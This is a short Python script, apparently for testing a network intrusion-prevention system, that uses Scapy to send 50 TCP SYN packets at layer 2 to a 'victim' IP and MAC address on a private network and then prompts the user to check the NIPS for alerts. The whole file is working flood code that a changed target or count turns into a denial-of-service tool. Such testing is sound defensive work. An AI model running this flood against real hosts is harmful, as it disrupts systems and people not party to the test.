# test_dos_flood.py
from scapy.all import sendp, IP, TCP, Ether, conf

# --- CONFIG ---
VICTIM_IP = "10.149.253.56"
VICTIM_MAC = "E8-FB-1C-59-E1-FF"
ATTACKER_INTERFACE = "Wi-Fi"
PACKET_COUNT = 50
# --- END CONFIG ---

conf.iface = ATTACKER_INTERFACE 
print(f"Sending {PACKET_COUNT} L2 flood packets to {VICTIM_IP} ({VICTIM_MAC})...")

packet = Ether(dst=VICTIM_MAC.replace("-", ":")) / IP(dst=VICTIM_IP) / TCP(dport=80, flags="S")
sendp(packet, count=PACKET_COUNT, iface=ATTACKER_INTERFACE, verbose=False)

print("Flood sent. Check your NIPS for 'Traffic Anomaly' and 'HIGH-ALERT' state.")